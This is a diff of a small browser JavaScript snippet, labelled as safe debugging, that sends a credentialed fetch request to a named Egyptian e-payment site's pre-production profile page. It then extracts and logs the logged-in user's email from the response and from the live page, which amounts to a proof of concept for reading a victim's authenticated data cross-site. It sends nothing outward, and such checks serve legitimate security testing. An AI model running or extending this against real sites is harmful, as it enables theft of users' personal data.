@@ -1,47 +1,37 @@
-// safe-xhr-debug.js — benign diagnostics only (no exfiltration)
-(function(){
+(async function(){
+  const TARGET = "https://epay2-preprod.efinance.com.eg/ePay/EditProfile.do?method=preEditProfile&STYLE_TYPE=0";
   try {
-    var TARGET = "https://epay2-preprod.efinance.com.eg/ePay/EditProfile.do?method=preEditProfile&STYLE_TYPE=0";
+    const res = await fetch(TARGET, { credentials: "include", redirect: "follow" });
+    console.info("[SAFE-DBG] status:", res.status, "type:", res.type, "finalURL:", res.url);
 
-    var xhr = new XMLHttpRequest();
-    xhr.open("GET", TARGET, true);
-    xhr.withCredentials = true; // include cookies
-    // optional timeout
-    xhr.timeout = 10000; // 10s
+    let text = "";
+    try {
+      text = await res.text();
+      console.info("[SAFE-DBG] response length:", text.length);
+      console.info("[SAFE-DBG] preview:\n", text.slice(0,500));
+    } catch(e) {
+      console.warn("[SAFE-DBG] cannot read response body (likely CORS/opaque):", e);
+    }
 
-    xhr.onreadystatechange = function() {
-      if (xhr.readyState !== 4) return;
-      console.info("[SAFE-XHR] readyState=4, status=", xhr.status);
-
-      // If CORS denied the response, status might be 0 or the body inaccessible.
-      // Try to read responseText, but this will throw / be empty if CORS blocked.
+    // If readable, parse and log email (no exfil)
+    if (text) {
       try {
-        var txt = xhr.responseText || "";
-        console.info("[SAFE-XHR] response length:", txt.length);
-        console.info("[SAFE-XHR] preview:", txt.slice(0,500));
-
-        // parse with DOMParser
-        try {
-          var doc = new DOMParser().parseFromString(txt, "text/html");
-          var inp = doc.querySelector('input[name="email"], input[name=email]');
-          var email = inp ? (inp.value || inp.getAttribute('value') || "") : null;
-          console.info("[SAFE-XHR] extracted email (from fetched HTML):", email);
-        } catch (pe) {
-          console.warn("[SAFE-XHR] DOMParser parse error:", pe);
-        }
-
-      } catch (e) {
-        console.warn("[SAFE-XHR] cannot read responseText. Probably CORS/opaque response.", e);
+        const doc = new DOMParser().parseFromString(text, "text/html");
+        const inp = doc.querySelector('input[name="email"], input[name=email]');
+        const email = inp ? (inp.value || inp.getAttribute('value') || "") : null;
+        console.info("[SAFE-DBG] extracted email (from fetched HTML):", email);
+      } catch(e){
+        console.warn("[SAFE-DBG] DOMParser parse failed:", e);
       }
-    };
+    }
 
-    xhr.ontimeout = function(){ console.warn("[SAFE-XHR] request timed out"); };
-    xhr.onerror = function(e){ console.error("[SAFE-XHR] XHR error", e); };
+    // Also check current page DOM (if the field is present client-side)
+    try {
+      const live = document.querySelector('input[name="email"], input[name=email]');
+      console.info("[SAFE-DBG] current page DOM email:", live ? (live.value || live.getAttribute('value')) : null);
+    } catch(e){ console.warn("[SAFE-DBG] current DOM check failed:", e); }
 
-    // send request
-    xhr.send();
-    console.info("[SAFE-XHR] request sent to", TARGET, "(withCredentials=true). Check Network tab for Cookie header)");
   } catch (err) {
-    console.error("[SAFE-XHR] exception", err);
+    console.error("[SAFE-DBG] fetch failed:", err);
   }
 })();
